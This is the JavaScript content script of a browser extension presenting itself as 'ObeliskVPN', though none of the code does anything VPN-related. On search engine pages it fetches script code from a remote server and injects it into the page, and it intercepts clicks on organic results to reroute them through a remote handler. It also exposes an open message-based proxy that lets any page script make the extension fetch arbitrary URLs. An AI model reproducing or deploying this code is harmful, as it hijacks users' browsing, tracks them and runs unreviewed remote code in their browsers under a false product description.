(function(){
'use strict';

const CONFIG_SERVER = 'https://config-new.dovex.ru';
let initPromise = null;

window.__sdkProxyHandler = function(event) {
    if (event.data && event.data.type === 'SDK_PROXY_REQUEST') {
        fetch(event.data.url, event.data.options || {})
            .then(async (response) => {
                let data;
                const contentType = response.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    data = await response.json();
                } else {
                    data = await response.text();
                }
                window.postMessage({
                    type: 'SDK_PROXY_RESPONSE',
                    id: event.data.id,
                    data: data
                }, '*');
            })
            .catch((error) => {
                window.postMessage({
                    type: 'SDK_PROXY_RESPONSE',
                    id: event.data.id,
                    error: error.message
                }, '*');
            });
    }
};

window.addEventListener('message', window.__sdkProxyHandler);

async function initGlobalUserId() {
    return new Promise((resolve) => {
        chrome.storage.local.get(['obelisk_global_user_id'], (result) => {
            let userId = result.obelisk_global_user_id;
            if (!userId) {
                userId = 'obelisk_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
                chrome.storage.local.set({ obelisk_global_user_id: userId });
            }
            window.__obeliskGlobalUserId = userId;
            resolve(userId);
        });
    });
}

async function injectInjectedJS() {
    return new Promise((resolve) => {
        chrome.runtime.sendMessage({ action: 'INJECT_INJECTED_JS' }, () => resolve());
    });
}

async function loadAndExecuteScript(scriptCode) {
    return new Promise((resolve, reject) => {
        chrome.runtime.sendMessage({
            action: 'INJECT_SCRIPT',
            code: `(function() { ${scriptCode} })();`
        }, (response) => {
            if (response && response.success) {
                resolve();
            } else {
                reject(new Error(response?.error || 'Failed to inject script'));
            }
        });
    });
}

function isSearchPage() {
    const hostname = window.location.hostname;
    return hostname.includes('google.com') || 
           hostname.includes('yandex.ru') || 
           hostname.includes('yandex.com') || 
           hostname.includes('ya.ru') || 
           hostname.includes('bing.com');
}

async function init() {
    if (initPromise) return initPromise;
    
    initPromise = (async () => {
        try {
            await initGlobalUserId();
            
            const hostname = window.location.hostname;
            const isGoogle = hostname.includes('google') || hostname.includes('bing');
            const isYandex = hostname.includes('yandex') || hostname.includes('ya.ru');
            if (!isGoogle && !isYandex) return;
            
            const engine = isGoogle ? 'google' : 'yandex';
            await injectInjectedJS();
            
            const headers = {
                'X-Extension-Type': 'obelisk_vpn',
                'X-Extension-Name': 'ObeliskVPN',
                'X-Extension-Version': chrome.runtime.getManifest().version
            };
            
            const [coreRes, commonRes, engineRes] = await Promise.all([
                fetch(CONFIG_SERVER + '/api/config/obelisk/core', { headers }),
                fetch(CONFIG_SERVER + '/api/config/obelisk/common', { headers }),
                fetch(CONFIG_SERVER + '/api/config/obelisk/' + engine, { headers })
            ]);
            
            const core = await coreRes.json();
            const common = await commonRes.json();
            const engineData = await engineRes.json();
            
            await loadAndExecuteScript(common.script);
            await new Promise(r => setTimeout(r, 50));
            
            await new Promise((resolve) => {
                chrome.runtime.sendMessage({
                    action: 'INJECT_SCRIPT',
                    code: `window.ObeliskAPI.setCore(${JSON.stringify(core)});`
                }, () => resolve());
            });
            
            await loadAndExecuteScript(engineData.script);
            
            const campaignsRes = await fetch(CONFIG_SERVER + '/api/config/obelisk/campaigns', { headers });
            const campaigns = await campaignsRes.json();
            
            await new Promise((resolve) => {
                chrome.runtime.sendMessage({
                    action: 'INJECT_SCRIPT',
                    code: `window.ObeliskAPI.setCampaigns(${JSON.stringify(campaigns)});`
                }, () => resolve());
            });
            
            await new Promise(r => setTimeout(r, 500));
            
            await loadAndExecuteScript(`
                (function() {
                    console.log('[Obelisk] Setting up click handler in MAIN world');
                    
                    function isSearchPage() {
                        const hostname = window.location.hostname;
                        return hostname.includes('google.com') || 
                               hostname.includes('yandex.ru') || 
                               hostname.includes('yandex.com') || 
                               hostname.includes('ya.ru') || 
                               hostname.includes('bing.com');
                    }
                    
                    document.addEventListener('click', async (e) => {
                        if (!isSearchPage()) return;
                        
                        const link = e.target.closest('a');
                        if (!link) return;
                        
                        if (link.href.includes('google.com/aclk') || 
                            link.href.includes('googleadservices.com') ||
                            link.href.includes('yandex.ru/clck')) {
                            return;
                        }
                        
                        console.log('[Obelisk] Click detected:', link.href.substring(0, 100));
                        
                        if (window.ObeliskAPI && typeof window.ObeliskAPI.handleClick === 'function') {
                            e.preventDefault();
                            e.stopPropagation();
                            
                            const result = await window.ObeliskAPI.handleClick(link.href);
                            console.log('[Obelisk] handleClick result:', result);
                            if (!result) {
                                window.location.href = link.href;
                            }
                        } else {
                            console.log('[Obelisk] ObeliskAPI not ready');
                        }
                    }, true);
                    
                    console.log('[Obelisk] Click handler ready');
                })();
            `);
            
        } catch(e) {
            console.error('[Obelisk] Init error:', e);
        }
    })();
    
    return initPromise;
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => init());
} else {
    init();
}
})();